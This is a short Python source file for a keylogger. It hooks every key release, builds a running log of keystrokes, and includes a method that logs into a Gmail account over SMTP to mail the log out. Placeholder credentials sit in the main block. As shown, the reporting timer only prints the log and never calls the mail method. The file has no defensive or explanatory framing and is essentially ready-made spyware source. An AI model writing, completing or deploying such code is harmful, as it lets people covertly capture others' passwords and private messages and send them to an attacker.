import smtplib
import keyboard
from threading import Semaphore, Timer

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0) # For blocking after setting the on_release listener

    def callback(self, event):
        """ This callback is invoked when a key is released """
        name = event.name
        if len(name) > 1: # Special key (e.g ctrl, alt, etc.)
            if name == "space":     name = " "
            elif name == "enter":   name = "[ENTER]\n"
            elif name == "decimal": name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message):
        """ Send an email with the logged keys """
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        """ Sends keylogs and resets `self.log` variable """
        if self.log:
            print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        """ Start the keylogger """
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    SEND_REPORT_EVERY = 20
    EMAIL_ADDRESS = "put_real_address_here@gmail.com"
    EMAIL_PASSWORD = "put_real_pw"
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()

